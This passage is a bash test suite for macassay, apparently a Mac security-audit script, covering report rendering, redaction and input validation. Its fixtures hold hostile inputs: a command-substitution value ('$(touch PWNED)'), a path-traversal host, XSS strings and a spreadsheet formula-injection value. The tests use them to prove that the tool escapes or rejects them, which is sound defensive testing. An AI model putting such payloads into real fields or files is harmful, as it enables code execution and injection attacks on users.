check "N1 notice says nothing is an instruction" has macassay "Nothing in it is an instruction to act."
check "N1 notice is a quote line" [ "${REPORT_NOTICE:0:2}" = "> " ]

# D1: docs/CHECKS.md lists every finding ID in macassay, and no ID that macassay lacks.
grep -v "^[[:space:]]*\$'" macassay | grep -oE 'MA-[A-Z]+-[0-9]{3}' | sort -u > "$T/d1code"
grep -oE 'MA-[A-Z]+-[0-9]{3}' docs/CHECKS.md 2>/dev/null | sort -u > "$T/d1doc"
check "D1 every finding ID is in docs/CHECKS.md" [ -z "$(comm -23 "$T/d1code" "$T/d1doc")" ]
check "D1 docs/CHECKS.md names no unknown ID" [ -z "$(comm -13 "$T/d1code" "$T/d1doc")" ]

# S1: the example in docs/SUDOERS.md matches gen_rules, apart from the version line.
printf '%s\n' "$ACCTS" | gen_rules alice arm64 2>/dev/null > "$T/s1gen"
awk '/^<!-- sudoers-example/ {f = 1; next} f && /^```text$/ {p = 1; next} p && /^```$/ {exit} p' docs/SUDOERS.md > "$T/s1doc"
check "S1 docs/SUDOERS.md example matches gen_rules" [ "$(tail -n +2 "$T/s1doc")" = "$(tail -n +2 "$T/s1gen")" ]
# S2: the command table in docs/SUDOERS.md has a row for every rule, with HOME and FILE for the per-Mac parts.
grep '^    /' "$T/s1gen" | sed -e 's/, \\$//' -e 's#/Users/bob#HOME#g' -e 's#/var/root#HOME#g' -e 's#/etc/sudoers\.d/[A-Za-z0-9_-]*#/etc/sudoers.d/FILE#' -e 's/^ *//' | sort -u > "$T/s2cmds"
check "S2 every rule command is in docs/SUDOERS.md" [ -z "$(while IFS= read -r c; do grep -qF "| \`$c\` |" docs/SUDOERS.md || echo "$c"; done < "$T/s2cmds")" ]

# Version 1.5 cases. Their fixtures live in $V, apart from the 1.3.1 files at $T/p1 to $T/p8, and their check names
# start with "1.5 " to keep them apart from the 1.3.1 P cases.
V="$T/v15"; mkdir -p "$V"
# P16 (V1): VERSION follows the release rule against the latest v* tag. Only the version number counts, never the date.
ver_gt() { local a1 a2 a3 b1 b2 b3 re='^[0-9]+\.[0-9]+\.[0-9]+$'
  [[ $1 =~ $re ]] && [[ $2 =~ $re ]] || return 1
  IFS=. read -r a1 a2 a3 <<< "$1"; IFS=. read -r b1 b2 b3 <<< "$2"
  [ "$a1" -gt "$b1" ] && return 0; [ "$a1" -lt "$b1" ] && return 1
  [ "$a2" -gt "$b2" ] && return 0; [ "$a2" -lt "$b2" ] && return 1
  [ "$a3" -gt "$b3" ]; }
# version_rule TAGVERSION CHANGED VERSION: CHANGED is 1 when macassay differs from the tag.
version_rule() {
  if [ "$2" = 0 ]; then [ "$3" = "$1" ]; return; fi
  [ "$3" = "$1+dev" ] && return 0
  case "$3" in *+*) return 1 ;; esac
  ver_gt "$3" "$1"; }
check "1.5 P16 unchanged script, tag version" version_rule 1.4.0 0 1.4.0
check "1.5 P16 unchanged script, +dev fails" not version_rule 1.4.0 0 1.4.0+dev
check "1.5 P16 changed script, +dev" version_rule 1.4.0 1 1.4.0+dev
check "1.5 P16 changed script, untagged higher release" version_rule 1.4.0 1 1.5.0
check "1.5 P16 changed script, tag version fails" not version_rule 1.4.0 1 1.4.0
check "1.5 P16 changed script, +dev of an older tag fails" not version_rule 1.4.0 1 1.3.2+dev
if git rev-parse --git-dir >/dev/null 2>&1 && P16TAG=$(git describe --tags --abbrev=0 --match 'v*' 2>/dev/null); then
  if git diff --quiet "$P16TAG" -- macassay; then P16CH=0; else P16CH=1; fi
  check "1.5 P16 VERSION ${VERSION%% *} follows the rule for $P16TAG" version_rule "${P16TAG#v}" "$P16CH" "${VERSION%% *}"
else echo "skip P16 working-tree case: not a git checkout or no v* tag"; fi

# P1: normalization keeps valid text, drops invalid bytes, redacts UUIDs (also one that an invalid byte split), and fails closed.
printf 'caf\303\251 ok\nbad \377 byte 11111111-2222-3333-4444-555555555555\nsplit 12345678\377-1234-1234-1234-123456789012 end\nover a\364\220\200\200b\nlead a\365\200\200\200b\nfive a\370\210\200\200\200b\nmax a\364\217\277\277b emoji \360\237\230\200 end\nsplit2 12345678\364\220\200\200-1234-1234-1234-123456789012 end\n' > "$V/p1in"
( export LC_ALL=C.UTF-8; normalize_file "$V/p1in" "$V/p1out" )
check "1.5 P1 normalize succeeds" [ $? -eq 0 ]
check "1.5 P1 output is valid UTF-8" sh -c 'iconv -f UTF-8 -t UTF-8 < "$1" > /dev/null 2>&1' _ "$V/p1out"
check "1.5 P1 non-ASCII text kept" has "$V/p1out" "café ok"
check "1.5 P1 line after an invalid byte kept and redacted" has "$V/p1out" "bad  byte <UUID>"
check "1.5 P1 UUID split by an invalid byte redacted" has "$V/p1out" "split <UUID> end"
check "1.5 P1 sequences iconv -c keeps are removed" not env LC_ALL=C grep -qE "$(printf '[\365-\377]|\364[\220-\277]')" "$V/p1out"
check "1.5 P1 above-range and lead-byte sequences dropped" has "$V/p1out" "over ab"
check "1.5 P1 lead F5 sequence dropped" has "$V/p1out" "lead ab"
check "1.5 P1 lead F8 sequence dropped" has "$V/p1out" "five ab"
check "1.5 P1 U+10FFFF and emoji kept" has "$V/p1out" "$(printf 'max a\364\217\277\277b emoji \360\237\230\200 end')"
check "1.5 P1 UUID split by an F4 90 sequence redacted" has "$V/p1out" "split2 <UUID> end"
if command -v python3 >/dev/null 2>&1; then
  check "1.5 P1 output passes a strict UTF-8 decoder" python3 -I -c 'import sys; sys.stdin.buffer.read().decode("utf-8")' < "$V/p1out"
else echo "skip P1 strict decoder case: python3 not installed"; fi
check "1.5 P1 no dashed UUID left" not grep -qE '[0-9A-Fa-f]{8}-[0-9A-Fa-f]{4}-[0-9A-Fa-f]{4}-' "$V/p1out"
( redact_ids() { return 1; }; normalize_file "$V/p1in" "$V/p1fail" )
check "1.5 P1 failed redaction returns 1" [ $? -eq 1 ]
check "1.5 P1 failed redaction leaves no file" [ ! -e "$V/p1fail" ]

# P20: finding writes six fields, with the section number from h2 and the source.
( FIND="$V/p20f"; : > "$FIND"; SECT_N=6
  finding MA-SHARING-022 LOW Sharing "a|b	c"; finding MA-SHARING-022 LOW Sharing "x" managed )
check "1.5 P20 six fields per finding" [ "$(awk -F'\t' '{print NF}' "$V/p20f" | sort -u)" = 6 ]
check "1.5 P20 section number" [ "$(cut -f5 "$V/p20f" | sort -u)" = 6 ]
check "1.5 P20 source local by default, managed when given" [ "$(cut -f6 "$V/p20f" | paste -sd, -)" = "local,managed" ]
check "1.5 P20 text cleaned" [ "$(head -1 "$V/p20f" | cut -f4)" = "a/b c" ]
# P19: every literal skip label has a SKIP_IDS row, the per-account labels match, and every ID in SKIP_IDS is known.
grep -v '^[[:space:]]*#' macassay | grep -oE '(^|[^A-Za-z_])(skip|priv) "[^"$]*"' | sed -E 's/^.*(skip|priv) "//; s/"$//' | sort -u > "$V/p19"
check "1.5 P19 skip labels found" [ "$(grep -c . "$V/p19")" -ge 19 ]
check "1.5 P19 every literal skip label has a row" [ -z "$(while IFS= read -r l; do skip_row "$l" >/dev/null || echo "$l"; done < "$V/p19")" ]
quiet() { "$@" > /dev/null; }
for l in "shell startup files (bob)" "authorized_keys (bob)" "LaunchAgents (bob)" "sudoers" "sudoers.d/extra_rules"; do
  check "1.5 P19 row for $l" quiet skip_row "$l"; done
grep -oE 'MA-[A-Z]+-[0-9]{3}' docs/CHECKS.md | sort -u > "$V/p19known"
check "1.5 P19 every ID in SKIP_IDS is known" [ -z "$(printf '%s\n' "$SKIP_IDS" | cut -f2 | tr ' ' '\n' | grep . | sort -u | comm -23 - "$V/p19known")" ]
( SKIPS="$V/p19s"; : > "$SKIPS"; skip "7-day log searches (XProtect, SSH)" "--quick" )
check "1.5 P19 skip writes the IDs" [ "$(cut -f4 "$V/p19s")" = "MA-EVENTS-001 MA-EVENTS-002" ]
check "1.5 P19 skip writes four fields" [ "$(awk -F'\t' '{print NF}' "$V/p19s")" = 4 ]
check "1.5 P19 Time Machine skip lists the three IDs" [ "$(skip_row "Time Machine backup age and encryption")" = "MA-BACKUPS-002 MA-BACKUPS-003 MA-BACKUPS-004" ]
# P14 (first part): enrollment state from profiles status output.
check "1.5 P14 not enrolled" [ "$(printf 'Enrolled via DEP: No\nMDM enrollment: No\n' | enroll_state)" = $'No\tNo' ]
check "1.5 P14 enrolled" [ "$(printf 'Enrolled via DEP: Yes\nMDM enrollment: Yes (User Approved)\n' | enroll_state)" = $'Yes\tYes' ]
check "1.5 P14 unreadable output" [ "$(printf 'profiles: error\n' | enroll_state)" = $'unknown\tunknown' ]
( profiles() { return 1; }; SKIPS="$V/p14s"; : > "$SKIPS"; read_enrollment; printf '%s %s\n' "$DEP" "$MDM" > "$V/p14r" )
check "1.5 P14 failed command gives unknown" [ "$(cat "$V/p14r")" = "unknown unknown" ]
check "1.5 P14 failed command records a skip" [ "$(cut -f1,2 "$V/p14s")" = $'other\tEnrollment state' ]
( profiles() { printf 'Enrolled via DEP: No\nMDM enrollment: Yes\n'; }; SKIPS="$V/p14t"; : > "$SKIPS"; read_enrollment; printf '%s %s\n' "$DEP" "$MDM" > "$V/p14u" )
check "1.5 P14 answered command records no skip" [ ! -s "$V/p14t" ]
check "1.5 P14 answered command sets the state" [ "$(cat "$V/p14u")" = "No Yes" ]
# P21: meta.tsv holds the 16 keys, each once.
( TMP="$V/p21"; mkdir -p "$TMP"; HOST=mini; TUSER=alice; NOW="2026-12-01 10:00 PST"; EPOCH=1764612000; QUICK=0; OFFLINE=1; SKIPDU=0
  NPR=3; NPS=1; NOS=2; RULES="$T/none"; BREW=""; DEP=No; MDM=No; HASBAT=1; write_meta )
check "1.5 P21 sixteen keys" [ "$(cut -f1 "$V/p21/meta.tsv" | sort -u | grep -c .)" -eq 16 ]
check "1.5 P21 no repeated key" [ "$(grep -c . "$V/p21/meta.tsv")" -eq 16 ]
check "1.5 P21 rules 0 when the file is absent" has "$V/p21/meta.tsv" $'rules\t0'

# P15: every ID in docs/CHECKS.md has one GUIDANCE line, no line names an unknown ID, and each text fits the rules.
grep -oE 'MA-[A-Z]+-[0-9]{3}' docs/CHECKS.md | sort -u > "$V/p15doc"
printf '%s\n' "$GUIDANCE" | cut -f1 | sort > "$V/p15ids"
check "1.5 P15 one line per ID" [ -z "$(uniq -d "$V/p15ids")" ]
check "1.5 P15 every documented ID has guidance" [ -z "$(comm -23 "$V/p15doc" "$V/p15ids")" ]
check "1.5 P15 no guidance for an unknown ID" [ -z "$(comm -13 "$V/p15doc" "$V/p15ids")" ]
check "1.5 P15 every text is non-empty, one field, no pipe or backtick, at most 200 characters, at most 25 words" \
  [ -z "$(printf '%s\n' "$GUIDANCE" | awk -F'\t' 'NF != 2 || $2 == "" || $2 ~ /[|`]/ || length($2) > 200 || split($2, w, " ") > 25')" ]
check "1.5 P15 no em-dash or en-dash in a text" \
  [ -z "$(printf '%s\n' "$GUIDANCE" | grep -e $'\xe2\x80\x94' -e $'\xe2\x80\x93')" ]
check "1.5 P15 guidance lookup" [ -n "$(guidance MA-SHARING-026)" ]
check "1.5 P15 known_id" known_id MA-SHARING-026
check "1.5 P15 unknown id" not known_id MA-SHARING-999

# Fixture run folder for the 1.5 render cases: hostile text in every field that can hold text from the audited Mac.
Q="'"
mkfix() { mkdir -p "$1"
  printf '%s\n' $'host\tmini' $'user\talice' $'date\t2026-12-01 10:00 PST' $'epoch\t1764612000' \
    $'version\t1.5.0 (2026-12-01)' $'quick\t0' $'offline\t0' $'skip_du\t0' $'priv_ran\t17' $'priv_skipped\t0' \
    $'other_skipped\t1' $'rules\t1' $'brew\t0' $'dep\tNo' $'mdm\tNo' $'laptop\t1' > "$1/meta.tsv"
  { printf 'MEDIUM\tMA-SHARING-026\tSharing\t<script>alert(1)</script> "q" %ss%s & \\ caf\303\251\t6\tlocal\n' "$Q" "$Q"
    printf 'LOW\tMA-SHARING-026\tSharing\t=HYPERLINK("http://x")\t6\tlocal\n'
    printf 'LOW\tMA-PLATFORM-015\tPlatform\t-dash 11111111-2222-3333-4444-555555555555 bad\377byte\t4\tmanaged\n'
  } > "$1/findings.tsv"
  printf 'other\t7-day log searches (XProtect, SSH)\t--quick\tMA-EVENTS-001 MA-EVENTS-002\n' > "$1/skipped.tsv"
  printf '%s\n' '' '## 4. Platform security' '' '- Quarantine: on' '' '## 6. Sharing and remote access' '' \
    '- AirDrop: <img src=x onerror=alert(1)>' '**Account **evil** <b>**' '' '```text' '[link](http://x) <script>x</script>' '```' > "$1/body.md"; }
# rfix DIR FORMATS [OUT]: renders fixture DIR with the given formats; without OUT the files are DIR.out.<extension>.
# Copies DIR.acc, when it exists, as the accepted-risk entries. Returns render_all's status; its stderr goes to DIR.err.
rfix() { ( TMP="$1.tmp"; mkdir -p "$TMP"; FMTS="$2"; OUT="${3:-}"; DEFBASE="$1.out"; STDOUT=0
  ACCEPTED=""; COMPARE=""; FAILON="${FAILON:-}"; rm -f "$TMP/acc.tsv"; [ -f "$1.acc" ] && cp "$1.acc" "$TMP/acc.tsv"
  render_all "$1" 2>"$1.err" ); }

# P2: Markdown keeps the 1.4 layout, with the Source column, the Management line, and the Guidance list.
mkfix "$V/p2"; rfix "$V/p2" md
check "1.5 P2 render succeeds" [ $? -eq 0 ]
P2=$V/p2.out.md
check "1.5 P2 notice after the title" [ "$(sed -n 3p "$P2")" = "$REPORT_NOTICE" ]
check "1.5 P2 Management line" has "$P2" "- Management: enrolled via Apple Business Manager: No; MDM enrollment: No"
check "1.5 P2 Source column" has "$P2" "| Severity | ID | Section | Finding | Source |"
check "1.5 P2 managed source" has "$P2" "| LOW | MA-PLATFORM-015 | Platform |"
check "1.5 P2 managed cell" grep -qE '^\| LOW \| MA-PLATFORM-015 .* \| managed \|$' "$P2"
check "1.5 P2 one guidance line per ID" [ "$(awk '/^### Guidance/ {g = 1; next} /^## / {g = 0} g && /^- MA-/' "$P2" | grep -c .)" -eq 2 ]
check "1.5 P2 counts" has "$P2" "- Findings: **0 HIGH**, **1 MEDIUM**, 2 LOW, 0 INFO"
check "1.5 P2 limitations list the skip" has "$P2" "- Skipped: 7-day log searches (XProtect, SSH) (--quick)"
check "1.5 P2 evidence follows" has "$P2" "## 6. Sharing and remote access"
check "1.5 P2 UUID redacted" not grep -q 11111111-2222 "$P2"
mkfix "$V/p2e"; : > "$V/p2e/findings.tsv"; rfix "$V/p2e" md
check "1.5 P2 empty findings" has "$V/p2e.out.md" "No automatic findings."
# P1 (end to end): a failed redaction writes no report and returns 1.
mkfix "$V/p1e"; ( redact_ids() { return 1; }; rfix "$V/p1e" md )
check "1.5 P1 render returns 1 when redaction fails" [ $? -eq 1 ]
check "1.5 P1 no report when redaction fails" [ ! -e "$V/p1e.out.md" ]
# P12a: validation drops hostile data-file lines, runs nothing from them, and keeps the output path.
mkfix "$V/p12a"
{ printf 'priv_ran\ta[$(touch PWNED)]\nbogus\tx\nhost\t../x\n'; cat "$V/p12a/meta.tsv"; } > "$V/p12a/m" && mv "$V/p12a/m" "$V/p12a/meta.tsv"
printf '%s\n' $'SEVERE\tMA-SHARING-026\tSharing\tx\t6\tlocal' $'LOW\tMA-FAKE-999\tSharing\tx\t6\tlocal' \
  $'LOW\tMA-SHARING-026\tSharing\tx\t15\tlocal' $'LOW\tMA-SHARING-026\tSharing\tx\t6\tremote' >> "$V/p12a/findings.tsv"
printf '%s\n' $'root\tx\ty\t' $'other\t\ty\t' $'other\tx\ty\tMA-FAKE' $'other\tx\ty' >> "$V/p12a/skipped.tsv"
( cd "$T" && rfix "$V/p12a" md )
check "1.5 P12a nothing ran from a meta value" [ ! -e "$T/PWNED" ]
check "1.5 P12a output path ignores meta host" [ -f "$V/p12a.out.md" ]
check "1.5 P12a bad host replaced" has "$V/p12a.out.md" "# Mac health and security audit: unknown"
check "1.5 P12a meta drops counted" has "$V/p12a.out.md" "- 5 line(s) of meta.tsv failed validation and were left out."
check "1.5 P12a findings drops counted" has "$V/p12a.out.md" "- 4 line(s) of findings.tsv failed validation and were left out."
check "1.5 P12a valid findings kept" [ "$(grep -c '^| [A-Z]* | MA-' "$V/p12a.out.md")" -eq 3 ]
check "1.5 P12a skipped drops counted" has "$V/p12a.out.md" "- 4 line(s) of skipped.tsv failed validation and were left out."
check "1.5 P12a valid skip kept" has "$V/p12a.out.md" "- Skipped: 7-day log searches (XProtect, SSH) (--quick)"
check "1.5 P12a out_paths, one format with -o" [ "$(out_paths r.txt base md)" = $'md\tr.txt' ]
check "1.5 P12a out_paths, default" [ "$(out_paths "" base md)" = $'md\tbase.md' ]

# P7: CSV quotes every field, doubles inner quotes, defuses formula starts, and keeps one field count.
mkfix "$V/p7"; rfix "$V/p7" csv
P7=$V/p7.out.csv
check "1.5 P7 render succeeds" [ -s "$P7" ]
check "1.5 P7 header" [ "$(head -1 "$P7" | tr -d '\r')" = '"severity","id","section","finding","source","accepted","guidance"' ]
check "1.5 P7 inner quotes doubled" has "$P7" '""q""'
check "1.5 P7 formula start defused" has "$P7" "\"'=HYPERLINK(\"\"http://x\"\")\""
check "1.5 P7 leading dash defused" has "$P7" "\"'-dash <UUID>"
check "1.5 P7 one field count" [ "$(tr -d '\r' < "$P7" | awk -F'","' '{print NF}' | sort -u | grep -c .)" -eq 1 ]
check "1.5 P7 CRLF line ends" [ "$(grep -c $'\r$' "$P7")" -eq "$(grep -c . "$P7")" ]
# P8: formats and paths.
check "1.5 P8 check_formats" [ "$(check_formats md,csv,md)" = "md csv" ]
check "1.5 P8 unknown format" not check_formats md,pdf
check "1.5 P8 empty format name" not check_formats md,,csv
check "1.5 P8 trailing empty name" not check_formats md,
check "1.5 P8 trailing empty name after two" not check_formats md,csv,
check "1.5 P8 base path with several formats" [ "$(out_paths base "" md csv | cut -f2 | paste -sd, -)" = "base.md,base.csv" ]
check "1.5 P8 one format keeps -o as given" [ "$(out_paths file.txt "" csv | cut -f2)" = "file.txt" ]
check "1.5 P8 trailing extension removed" [ "$(out_paths report.md "" md json | cut -f2 | paste -sd, -)" = "report.md,report.json" ]
mkfix "$V/p8"; rfix "$V/p8" "md csv" "$V/p8base"
check "1.5 P8 md written" [ -s "$V/p8base.md" ]
check "1.5 P8 csv written" [ -s "$V/p8base.csv" ]
# P17 (part): usage errors exit 2 before any audit work.
# p17 ARGS: the run exits 2 with a usage error that names no unknown option, before any audit work.
p17() { ./macassay "$@" > "$V/p17.out" 2>&1; P17RC=$?; [ "$P17RC" -eq 2 ] && hasnt "$V/p17.out" "== 1." && hasnt "$V/p17.out" "Unknown option"; }
check "1.5 P17 --stdout with two formats" p17 --stdout --format md,csv
check "1.5 P17 unknown format" p17 --format pdf
for m in --print-sudoers --install-sudoers; do
  check "1.5 P17 --format with $m" p17 "$m" --format md
  check "1.5 P17 -o with $m" p17 "$m" -o x.md
  check "1.5 P17 --stdout with $m" p17 "$m" --stdout
done

# JSON helpers for the tests: jx FILE EXPR evaluates EXPR with d bound to the parsed file; jxl does the same for
# newline-delimited JSON, with d an array of events. Test input only.
JX_JS='function run(a) { var t = $.NSString.stringWithContentsOfFileEncodingError(a[0], $.NSUTF8StringEncoding, null).js;
  var d = a[2] === "l" ? t.split("\n").filter(String).map(function (l) { return JSON.parse(l); }) : JSON.parse(t);
  return String(new Function("d", "return (" + a[1] + ");")(d)); }'
jx()  { osascript -l JavaScript -e "$JX_JS" "$1" "$2" j 2>/dev/null; }
jxl() { osascript -l JavaScript -e "$JX_JS" "$1" "$2" l 2>/dev/null; }
# P3: JSON parses, round-trips hostile text, and carries the schema and counts.
mkfix "$V/p3"; rfix "$V/p3" json
P3=$V/p3.out.json
check "1.5 P3 plutil accepts the JSON" plutil -convert xml1 -o /dev/null "$P3"
check "1.5 P3 schema" [ "$(jx "$P3" 'd.schema')" = "macassay-report/1" ]
check "1.5 P3 hostile text round-trips" [ "$(jx "$P3" 'd.findings[0].text')" = "<script>alert(1)</script> \"q\" ${Q}s${Q} & \\ café" ]
check "1.5 P3 formula text round-trips" [ "$(jx "$P3" 'd.findings[1].text')" = '=HYPERLINK("http://x")' ]
check "1.5 P3 normalized text round-trips" [ "$(jx "$P3" 'd.findings[2].text')" = "-dash <UUID> badbyte" ]
mkfix "$V/p17e"; rfix "$V/p17e" "md json" "$V/p17e-report.md"
check "1.5 P17 -o report.md with md and json writes report.md" [ -s "$V/p17e-report.md" ]
check "1.5 P17 -o report.md with md and json writes report.json" [ -s "$V/p17e-report.json" ]
check "1.5 P3 counts" [ "$(jx "$P3" '[d.counts.HIGH, d.counts.MEDIUM, d.counts.LOW, d.counts.INFO, d.counts.accepted].join()')" = "0,1,2,0,0" ]
check "1.5 P3 typed options" [ "$(jx "$P3" 'typeof d.options.quick + " " + typeof d.epoch')" = "boolean number" ]
check "1.5 P3 guidance present" [ -n "$(jx "$P3" 'd.findings[2].guidance')" ]
check "1.5 P3 no changes block without --compare" [ "$(jx "$P3" '"changes" in d')" = false ]
# P4: OCSF events hold the required 1.10.0 attributes with the mapped values.
mkfix "$V/p4"; printf 'MA-PLATFORM-015\t\tforced by IT\n' > "$V/p4.acc"; rfix "$V/p4" ocsf
P4=$V/p4.out.ocsf.jsonl
check "1.5 P4 four events" [ "$(jxl "$P4" 'd.length')" = 4 ]
check "1.5 P4 required attributes" [ "$(jxl "$P4" 'd.every(function (e) { return e.activity_id === 1 && e.category_uid === 2 && e.class_uid === 2003 && e.type_uid === 200301 && e.compliance && e.finding_info.uid && e.metadata.version === "1.10.0" && e.metadata.product.name === "macAssay" && e.severity_id >= 1 && e.time === 1764612000000 && e.device.type_id === 3 && e.device.hostname === "mini"; })')" = true ]
check "1.5 P4 MEDIUM is severity 3" [ "$(jxl "$P4" 'd[0].severity_id')" = 3 ]
check "1.5 P4 skipped check is Warning" [ "$(jxl "$P4" 'd[3].compliance.status_id + " " + d[3].compliance.status_details[0]')" = "2 --quick" ]
check "1.5 P4 accepted finding is Suppressed" [ "$(jxl "$P4" 'd[2].status_id')" = 3 ]
check "1.5 P4 open finding is New" [ "$(jxl "$P4" 'd[0].status_id')" = 1 ]
check "1.5 P4 remediation holds guidance" [ -n "$(jxl "$P4" 'd[0].remediation.desc')" ]
# P18: two findings with one ID and two skipped checks give four distinct uids; control keeps the bare ID.
mkfix "$V/p18"; printf 'priv\tbputil -d\trefused or unavailable\tMA-PLATFORM-009\n' >> "$V/p18/skipped.tsv"; rfix "$V/p18" ocsf
P18=$V/p18.out.ocsf.jsonl
check "1.5 P18 distinct uids" [ "$(jxl "$P18" 'd.map(function (e) { return e.finding_info.uid; }).filter(function (u, i, a) { return a.indexOf(u) === i; }).length')" = 5 ]
check "1.5 P18 uid form" [ "$(jxl "$P18" 'd[1].finding_info.uid')" = "mini:MA-SHARING-026:2" ]
check "1.5 P18 skip uid form" [ "$(jxl "$P18" 'd[4].finding_info.uid')" = "mini:MA-SKIP:2" ]
check "1.5 P18 control is the bare ID" [ "$(jxl "$P18" 'd[1].compliance.control')" = "MA-SHARING-026" ]

# P6: md_html converts each construct that macAssay writes, and escapes before it converts.
printf '%s\n' '## 6. Sharing and remote access' '### Memory' '**Top 15 processes by memory**' '- Swap: `a<b`' \
  '| Rule | Path |' '|---|---|' '| Allow | `p&q` |' '' 'Skipped (--quick).' '```text' 'x < y ``` z' '```' 'after ``` fence' \
  '**Account **evil** <b>**' '[link](http://x)' > "$V/p6in"
md_html < "$V/p6in" > "$V/p6"
check "1.5 P6 h2 with section anchor" has "$V/p6" '<details open id="section-6"><summary><h2>6. Sharing and remote access</h2></summary>'
check "1.5 P6 h3" has "$V/p6" '<h3>Memory</h3>'
check "1.5 P6 bold line" has "$V/p6" '<p><strong>Top 15 processes by memory</strong></p>'
check "1.5 P6 list item with inline code" has "$V/p6" '<li>Swap: <code>a&lt;b</code></li>'
check "1.5 P6 table header" has "$V/p6" '<table><thead><tr><th>Rule</th><th>Path</th></tr></thead><tbody>'
check "1.5 P6 table row" has "$V/p6" '<tr><td>Allow</td><td><code>p&amp;q</code></td></tr>'
check "1.5 P6 plain line" has "$V/p6" '<p>Skipped (--quick).</p>'
check "1.5 P6 fenced block" has "$V/p6" '<pre><code>x &lt; y ``` z'
check "1.5 P6 a fence inside text stays text" not grep -q '<pre><code>after' "$V/p6"
check "1.5 P6 bold around attacker text stays escaped" has "$V/p6" '&lt;b&gt;'
check "1.5 P6 no link from text" hasnt "$V/p6" '<a '
check "1.5 P6 details closed" [ "$(tail -1 "$V/p6")" = "</details>" ]
# P5: the page holds no script, handler, image, or external link, escapes hostile text, and links findings to sections.
mkfix "$V/p5"; rfix "$V/p5" html
P5=$V/p5.out.html
check "1.5 P5 render succeeds" [ -s "$P5" ]
for bad in '<script' '<img' 'href="http'; do check "1.5 P5 no $bad" hasnt "$P5" "$bad"; done
check "1.5 P5 no event handler in a tag" not grep -qE '<[a-zA-Z][^>]* on[a-z]+=' "$P5"
check "1.5 P5 escaped script" has "$P5" '&lt;script&gt;alert(1)&lt;/script&gt;'
check "1.5 P5 escaped quotes" has "$P5" '&quot;q&quot; &#39;s&#39; &amp; \ café'
check "1.5 P5 CSP is the first element in head" [ "$(awk '/<head>/ {getline; print; exit}' "$P5")" = "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; style-src 'unsafe-inline'; base-uri 'none'; form-action 'none'\">" ]
check "1.5 P5 every finding link has a section" [ -z "$(grep -oE 'href="#section-[0-9]+"' "$P5" | sed 's/href="#//; s/"$//' | sort -u | while read -r a; do grep -q "id=\"$a\"" "$P5" || echo "$a"; done)" ]
check "1.5 P5 four filter buttons" [ "$(grep -c 'type="radio" name="sev"' "$P5")" -eq 4 ]
# P8 (rest): three formats with one base path.
mkfix "$V/p8b"; rfix "$V/p8b" "md json html" "$V/p8b-base"
for e in md json html; do check "1.5 P8 $e written with two other formats" [ -s "$V/p8b-base.$e" ]; done

# P9: accepted risks.
printf '%s\n' '# comment' '' 'MA-PLATFORM-015   # forced by IT | `x` <script>' \
  'MA-SHARING-026 =HYPERLINK("http://x")   # approved' 'MA-SHARING-026 .*' > "$V/p9.txt"
mkdir -p "$V/p9tmp"; la() { TMP="$V/p9tmp" load_accepted "$@"; }
la "$V/p9.txt" > "$V/p9.acc"
check "1.5 P9 load succeeds" [ $? -eq 0 ]
check "1.5 P9 comments and blank lines ignored" [ "$(grep -c . "$V/p9.acc")" -eq 3 ]
check "1.5 P9 reason cleaned" [ "$(head -1 "$V/p9.acc" | cut -f3)" = "forced by IT / x <script>" ]
mkfix "$V/p9r"; cp "$V/p9.acc" "$V/p9r.acc"; rfix "$V/p9r" "md html json" "$V/p9base"
check "1.5 P9 ID-only line accepts every finding with the ID" grep -qE '^\| LOW \| MA-PLATFORM-015 .* \| forced by IT / x <script> \|$' "$V/p9base.md"
check "1.5 P9 whole-text match accepts" grep -qE '^\| LOW \| MA-SHARING-026 \| Sharing \| =HYPERLINK\("http://x"\) \| approved \|$' "$V/p9base.md"
check "1.5 P9 regex characters match as fixed text" grep -qE '^\| MEDIUM \| MA-SHARING-026 .* \|  \|$' "$V/p9base.md"
check "1.5 P9 a regex line accepts nothing" not grep -qE '^\| MEDIUM \| MA-SHARING-026 .* \|  \|$' <(sed -n '/^## Accepted risks/,/^## Limitations/p' "$V/p9base.md")
check "1.5 P9 accepted findings leave the open counts" has "$V/p9base.md" "- Findings: **0 HIGH**, **1 MEDIUM**, 0 LOW, 0 INFO, 2 accepted"
check "1.5 P9 reason escaped in HTML" has "$V/p9base.html" 'forced by IT / x &lt;script&gt;'
check "1.5 P9 JSON accepted list" [ "$(jx "$V/p9base.json" 'd.accepted.length + " " + d.counts.accepted')" = "2 2" ]
printf 'MA-SHARING-026 =HYPERLINK\n' > "$V/p9part.txt"; la "$V/p9part.txt" > "$V/p9part.acc"
mkfix "$V/p9p"; cp "$V/p9part.acc" "$V/p9p.acc"; rfix "$V/p9p" md
check "1.5 P9 partial text does not accept" not grep -q '^## Accepted risks' "$V/p9p.out.md"
printf 'MA-SHARING-999\n' > "$V/p9bad.txt"
check "1.5 P9 unlisted ID fails" not la "$V/p9bad.txt"
printf 'MA-SHARING-026 a\365b # r\n' > "$V/p9inv.txt"
check "1.5 P9 invalid byte does not give an empty match" [ -n "$(la "$V/p9inv.txt" 2>/dev/null | cut -f2)" ]
mkdir -p "$V/p9dir"
check "1.5 P9 a directory fails" not la "$V/p9dir"
check "1.5 P9 bad ID exits 2 before any audit work" p17 --accepted "$V/p9bad.txt"
for m in --print-sudoers --install-sudoers; do check "1.5 P17 --accepted with $m" p17 "$m" --accepted "$V/p9.txt"; done

# P10: comparison groups, schema check, untrusted old text.
cat > "$V/p10old.json" <<'EOF'
{"schema": "macassay-report/1", "host": "mini", "date": "2026-11-30 09:00 PST", "options": {"quick": false, "offline": false, "skip_du": false},
 "findings": [{"id": "MA-SHARING-026", "severity": "LOW", "section": "Sharing", "text": "old"},
              {"id": "MA-BACKUPS-001", "severity": "MEDIUM", "section": "Backups", "text": "gone\tnow\n<script>x</script>"},
              {"id": "MA-EVENTS-002", "severity": "MEDIUM", "section": "Events", "text": "not run 11111111-2222-3333-4444-555555555555"},
              {"id": "bad id", "severity": "HIGH", "section": "x", "text": "dropped"}]}
EOF
printf '\377' >> "$V/p10old.json"
( TMP="$V/p10t"; mkdir -p "$TMP"; compare_load "$V/p10old.json" )
check "1.5 P10 old file loads" [ $? -eq 0 ]
mkfix "$V/p10"; ( TMP="$V/p10.tmp"; mkdir -p "$TMP"; compare_load "$V/p10old.json"; FMTS="md html json"; OUT="$V/p10base"; DEFBASE=x
  STDOUT=0; FAILON=""; COMPARE="$V/p10old.json"; render_all "$V/p10" 2>/dev/null )
C=$V/p10.tmp/render/changes.tsv
check "1.5 P10 new: ID only in this run" grep -q $'^new\tMA-PLATFORM-015\t' "$C"
